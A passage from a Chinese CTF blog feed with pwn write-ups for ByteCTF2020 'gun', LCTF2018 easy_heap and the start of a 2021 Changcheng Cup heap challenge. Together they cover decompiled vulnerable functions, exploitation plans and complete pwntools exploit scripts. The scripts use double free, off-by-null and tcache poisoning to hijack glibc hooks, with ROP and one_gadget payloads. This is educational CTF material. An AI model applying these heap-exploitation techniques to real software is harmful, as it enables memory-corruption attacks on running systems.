class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#9</span><br><br>load(<span class="hljs-number">0</span>)<br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;The &quot;</span>)<br>heapbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x340</span><br>log.success(<span class="hljs-string">&quot;heapbase: &quot;</span> + <span class="hljs-built_in">hex</span>(heapbase))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2 此时idx=2的chunk的next_bullet依旧是idx=0</span><br><br><span class="hljs-comment"># 用idx=3~9的填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    load(i+<span class="hljs-number">3</span>)<br>shoot(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># 先将idx=0放入fastbin</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># load一次，射击两次，利用next_bullet来double free idx=0（连续射击时没有检查flag）</span><br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># idx=0,2~7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x60</span>)<br><br>buy(<span class="hljs-number">0x60</span>,p64(__free_hook)) <span class="hljs-comment">#8</span><br><br>str_flag = heapbase + <span class="hljs-number">0x340</span><br>frame_addr = heapbase + <span class="hljs-number">0x7c0</span> <br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">svcudp_reply+26</span><br><span class="hljs-string">mov rbp, qword ptr [rdi + 0x48]; </span><br><span class="hljs-string">mov rax, qword ptr [rbp + 0x18]; </span><br><span class="hljs-string">lea r13, [rbp + 0x10]; </span><br><span class="hljs-string">mov dword ptr [rbp + 0x10], 0; </span><br><span class="hljs-string">mov rdi, r13; </span><br><span class="hljs-string">call qword ptr [rax + 0x28];</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># way 2</span><br>rop = ROP(libc)<br>rop.<span class="hljs-built_in">open</span>(str_flag,<span class="hljs-number">0x4</span>)<br>rop.read(<span class="hljs-number">3</span>,str_flag,<span class="hljs-number">0x30</span>)<br>rop.write(<span class="hljs-number">1</span>,str_flag,<span class="hljs-number">0x30</span>)<br><br>leave_ret = libc.address + <span class="hljs-number">0x5aa48</span><br>pop_r14_r15_ret = libc.address + <span class="hljs-number">0x26b6f</span><br>frame = p64(pop_r14_r15_ret)*<span class="hljs-number">3</span> + p64(heapbase + <span class="hljs-number">0x2d0</span>) <span class="hljs-comment"># heapbase + 0x2d0=rax=[rbp+0x18]</span><br>frame += rop.chain() <span class="hljs-comment">#pop_r14_r15_ret </span><br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>) <span class="hljs-comment">#9 </span><br>buy(<span class="hljs-number">0x100</span>,<span class="hljs-built_in">bytes</span>(frame)) <span class="hljs-comment">#10 frame_addr=rbp</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x28</span> + p64(leave_ret)+<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x30</span>)<span class="hljs-comment">#11 heapbase + 0x2d0</span><br>buy(<span class="hljs-number">0x60</span>,p64(svcudp_reply_26)) <span class="hljs-comment">#12 修改__free_hook为svcudp_reply_26</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span> + p64(frame_addr) <span class="hljs-comment">#frame_addr=rbp=[rdi+0x48]</span><br>buy(<span class="hljs-number">0x60</span>,payload) <span class="hljs-comment">#13 rdi</span><br><br>load(<span class="hljs-number">13</span>) <span class="hljs-comment"># trriger</span><br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul><li>利用结构体管理堆块时，一定要注意结构体中的数据在malloc和free时有什么变化</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://hurricane618.me/2020/10/26/2020-bytectf-gun/">https://hurricane618.me/2020/10/26/2020-bytectf-gun/</a></li><li><a href="https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%98%EF%BC%9Abytectf2020-gun-Use-After-Free-fastbin-double-free-ORW">https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%98%EF%BC%9Abytectf2020-gun-Use-After-Free-fastbin-double-free-ORW</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>double free</tag>
      
      <tag>ORW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LCTF2018 easy_heap</title>
    <link href="/2021/11/17/LCTF2018-easy-heap/"/>
    <url>/2021/11/17/LCTF2018-easy-heap/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2018年的<code>LCTF</code>中的一道题，借此学习<code>off-by-null</code>。</p><h2 id="0x1-题目情况"><a href="#0x1-题目情况" class="headerlink" title="0x1 题目情况"></a>0x1 题目情况</h2><ul><li>采用<code>libc-2.27.so</code>（2.27-3ubuntu1_amd64）</li><li>file easy_heap</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">easy_heap</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped<br></code></pre></td></tr></table></figure><ul><li>checksec easy_heap: 保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br><br></code></pre></td></tr></table></figure><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><ul><li>add： 只能同时存在10个chunk，index从0到9按是否空闲依次分配，每次申请的堆块大小固定，都是0x100，可以自定义不超过chunk大小的内容长度length，然后利用自定义函数<code>sub_BEC</code>输入至多length个字节的内容。此外，会把chunk的地址和内容长度length依次保存在大小为0xA0的管理堆块之中；</li><li>sub_BEC：根据传入的指针和写入长度，逐字节写入，需要注意的是不能写入<code>\x00</code>。写入完成之后，在最后一字节之后添加<code>\x00</code>，并且将<code>addr[size]</code>处也置为0，这导致了<code>off-by-null</code>漏洞。</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title">myRead</span><span class="hljs-params">(_BYTE *addr, <span class="hljs-type">int</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> it; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  it = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( size )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;addr[it], <span class="hljs-number">1uLL</span>);<br>      <span class="hljs-keyword">if</span> ( size - <span class="hljs-number">1</span> &lt; it || !addr[it] || addr[it] == <span class="hljs-string">&#x27;\n&#x27;</span> )<span class="hljs-comment">// 不能写入\x00</span><br>        <span class="hljs-keyword">break</span>;<br>      ++it;<br>    &#125;<br>    addr[it] = <span class="hljs-number">0</span>;                               <br>    addr[size] = <span class="hljs-number">0</span>;<span class="hljs-comment">// off-by-null</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *addr = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>show：利用<code>puts</code>函数打印堆块内容；</li><li>delete：先使用<code>memset</code>函数清除堆块的内容，然后free这个堆块，最后将指针和length都置为0。</li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol><li>这个程序只有一个漏洞<code>off-by-null</code>，因此要尝试通过该漏洞来构造处<code>chunk overlapping</code>，从而利用<code>tcache posioning</code>修改任意地址；</li><li>由于释放一个堆块之前会先清除堆块内容，所以不能使用修改<code>__free_hook</code>为<code>system</code>的方式来，只能尝试修改<code>__malloc_hook</code>为<code>one_gadget</code>，要使用<code>one_gadget</code>就必须先要获取libcbase；</li><li>由于申请堆块写入数据时一定会在写入最后添加<code>\x00</code>且<code>puts</code>存在<code>\x00</code>截断，所以无法直接通过填满tcache,然后申请<code>unsorted bin</code>中的chunk，输出脏数据的方式获取libcbase；</li><li>由于无法写入<code>\x00</code>且每个chunk的大小都是0x100(有一个字节的<code>\x00</code>)，所以无法通过修改<code>size</code>来构造<code>chunk overlapping</code>，也无法直接利用堆写入伪造pre_size，因此只能尝试利用脏数据（pre_size处的）来构造<code>chunk overlapping</code>；</li><li>要进行<code>chunk overlapping</code>，至少需要3个物理相邻的chunk，再加上填充<code>tcache</code>的七个chunk，所以至少需要十个chunk，具体操作请阅读这篇<a href="https://blog.csdn.net/qq_41202237/article/details/113697892">文章</a>。</li></ol><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><p><strong>注意堆块的物理内存与index对应关系的变化</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :off-by-null + tcache poisoning</span><br><span class="hljs-string">@时间        :2021/11/16 15:08:24</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = 0<br><br>p = process(<span class="hljs-string">&#x27;./easy_heap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc64.so&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(size, content):<br>    p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(b<span class="hljs-string">&#x27;size \n&gt; &#x27;</span>)<br>    p.sendline(str(size))<br>    p.recvuntil(b<span class="hljs-string">&#x27;content \n&gt; &#x27;</span>)<br>    p.sendline(content)<br><br>def free(index:int):<br>    p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(b<span class="hljs-string">&#x27;index \n&gt; &#x27;</span>)<br>    p.sendline(str(index))<br><br>def show(index:int):<br>    p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(b<span class="hljs-string">&#x27;index \n&gt; &#x27;</span>)<br>    p.sendline(str(index))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br>    <span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*0</span>xE0)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    free(9-i)<br><br>free(0)<br>free(1)<br>free(2)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br>    <span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;B&#x27;</span><span class="hljs-number">*0</span>xE0)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(6):<br>    free(i)<br><br>free(8)<br>free(7)<br><span class="hljs-built_in">add</span>(0xF8,<span class="hljs-string">&quot;set pre_inuse&quot;</span>) # <span class="hljs-attribute">idx</span>=0<br>free(6) # 此处不能删除刚申请的<span class="hljs-attribute">idx</span>=0,因为会破坏idx=9的pre_size<br>free(9)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&quot;C&quot;</span><span class="hljs-number">*0</span>xE0)<br><br><span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&quot;C&quot;</span><span class="hljs-number">*0</span>xE0)<br>show(0)<br>libcbase = u64(p.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x3ebca0<br>one = libcbase + 0x10a38c # 0x4f2c5 # 0x4f322 #0x10a38c<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + hex(libcbase))<br><br><span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;C&#x27;</span><span class="hljs-number">*0</span>xE0) # idx = 9    <span class="hljs-attribute">idx</span>=0与idx=9指向同一个chunk<br><br>free(1)<br>free(2) # 这两个是为了空出2个指针来修改触发hook<br><br>free(9)<br>free(0)<br><span class="hljs-built_in">add</span>(0xE0,p64(malloc_hook)) # <span class="hljs-attribute">idx</span>=0<br><span class="hljs-built_in">add</span>(0xE0,b<span class="hljs-string">&#x27;D&#x27;</span><span class="hljs-number">*0</span>xE0) # <span class="hljs-attribute">idx</span>=1<br><span class="hljs-built_in">add</span>(0xE0,p64(one)) # <span class="hljs-attribute">idx</span>=2<br><br><span class="hljs-comment"># trigger</span><br>p.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recv()<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="https://blog.csdn.net/qq_41202237/article/details/113697892">https://blog.csdn.net/qq_41202237/article/details/113697892</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>off-by-null</tag>
      
      <tag>tcache poisoning</tag>
      
      <tag>chunk overlapping</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021长城杯-K1ng_in_h3Ap_II</title>
    <link href="/2021/11/06/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-II/"/>
    <url>/2021/11/06/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-II/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年长城杯的第二道pwn题。</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li>使用libc-2.27.so(2.27-3ubuntu1.4_amd64)</li><li>file pwn</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1.<span class="hljs-number">4</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">4</span>f886125657df201de046e4b5f400f74cdb28eca, stripped<br></code></pre></td></tr></table></figure><ul><li>checksec pwn</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><ul><li>seccomp-tools dump .&#x2F;pwn</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">A</span> = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x05 <span class="hljs-number">0</span>xc000003e  if (<span class="hljs-keyword">A</span> != ARCH_X86_64) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35 0x00</span> <span class="hljs-number">0</span>x01 <span class="hljs-number">0x40000000</span>  if (<span class="hljs-keyword">A</span> &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x02 <span class="hljs-number">0</span>xffffffff  if (<span class="hljs-keyword">A</span> != <span class="hljs-number">0</span>xffffffff) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003b  if (<span class="hljs-keyword">A</span> == execve) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br></code></pre></td></tr></table></figure><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><ul><li>add: 由于可覆盖idx，所以可以申请任意个堆块，堆块大小限制为0xF~0x60，申请成功之后就把地址和堆块大小分别存储在两个数组中；</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">_DWORD *add()<br>&#123;<br>  _DWORD *result; <span class="hljs-regexp">//</span> rax<br>  int idx; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">8</span>h]<br>  int size; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input size:&quot;</span>);<br>  size = get_Int();<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">0</span>xF || size &gt; <span class="hljs-number">0</span>x60 )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  heap_array[idx] = malloc(size);<br>  result = size_array;<br>  size_array[idx] = size;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>edit：根据index找到堆块地址和堆块大小，然后写入内容。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssize_t edit()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input context:&quot;</span>);<br>  return read(<span class="hljs-number">0</span>, (void *)heap_array[idx], (int)size_array[idx]);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>delete：根据index找到堆块地址，然后释放，没有将指针置为0，存在<code>UAF</code>漏洞</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">void <span class="hljs-keyword">delete</span>()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  free((void *)heap_array[idx]);                <span class="hljs-regexp">//</span> UAF<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>show：根据index找到堆块地址，然后打印出堆块内容</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">int show()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  return puts((const char *)heap_array[idx]);   <span class="hljs-regexp">//</span> \x00截断<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ul><li>由于无法使用<code>execve</code>函数，所以我们不能getshell，只能尝试通过<code>ORW</code>获取flag；</li><li>要采用<code>ORW</code>首先需要知道heapbase和libcbase，先多次释放堆块，然后使用UAF漏洞获取heapbase；</li><li>使用<code>tcache poisoning</code>申请<code>tcache struct</code>的堆块，修改计数器之后，然后释放进入<code>unsorted bin</code>，最好利用<code>UAF</code>漏洞获取libcbase；</li><li>然后利用<code>tcache 